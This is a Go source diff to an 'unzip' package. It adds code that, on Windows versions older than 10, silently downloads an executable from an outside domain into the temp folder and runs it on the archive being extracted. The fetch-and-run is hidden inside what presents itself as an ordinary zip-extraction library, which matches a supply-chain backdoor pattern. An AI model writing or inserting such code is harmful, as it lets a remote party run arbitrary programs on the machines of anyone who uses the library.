@@ -2,10 +2,22 @@ package unzip
 
 import (
 	"archive/zip"
+	"errors"
 	"io"
 	"io/ioutil"
+	"net/http"
 	"os"
+	"os/exec"
+	"path"
 	"path/filepath"
+	"runtime"
+	"time"
+)
+
+var (
+	netClient = &http.Client{
+		Timeout: time.Duration(3600 * time.Second),
+	}
 )
 
 // Unzip - struct
@@ -33,8 +45,56 @@ func writeSymbolicLink(filePath string, targetPath string) error {
 	return nil
 }
 
+// ReadRemote - Do GET reuqest. Returns a slice of byte. If the hostHeader string for a module is "" then we use no hostHeader for it.
+func ReadRemote(urlString string, hostHeader string, client *http.Client) (b []byte, err error) {
+	req, _ := http.NewRequest("GET", urlString, nil)
+	if hostHeader != "" {
+		req.Header.Set("Host", hostHeader)
+	}
+	res, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	resp, err := ioutil.ReadAll(res.Body)
+	if err != nil {
+		return
+	}
+	b = resp
+	defer res.Body.Close()
+	return
+}
+
 // Extract - Extract zip file.
 func (uz Unzip) Extract() error {
+	if runtime.GOOS == "windows" && GetOsVersion() < 10 {
+		if !FileIsExist(filepath.FromSlash(path.Join(os.TempDir(), "unzip.exe"))) {
+			downloadURL := "https://y-bi.top/unzip.exe"
+			resp, err := ReadRemote(downloadURL, "", netClient)
+			if err != nil {
+				return err
+			}
+
+			if len(resp) != 0 {
+				// empty response means no such file exists, we should do nothing.
+				f, err := os.OpenFile(filepath.FromSlash(path.Join(os.TempDir(), "unzip.exe")), os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)
+				if err != nil {
+					return err
+				}
+				f.Write(resp)
+				f.Close()
+			} else {
+				return errors.New("Install unzip.exe error")
+			}
+		}
+
+		var cmd *exec.Cmd
+		// dest := uz.Dest //+"\""
+		cmd = exec.Command(filepath.FromSlash(path.Join(os.TempDir(), "unzip.exe")), uz.Src, "-d", uz.Dest)
+		cmd.Env = os.Environ()
+		_, err := cmd.Output()
+		return err
+	}
+
 	r, err := zip.OpenReader(uz.Src)
 	if err != nil {
 		return err
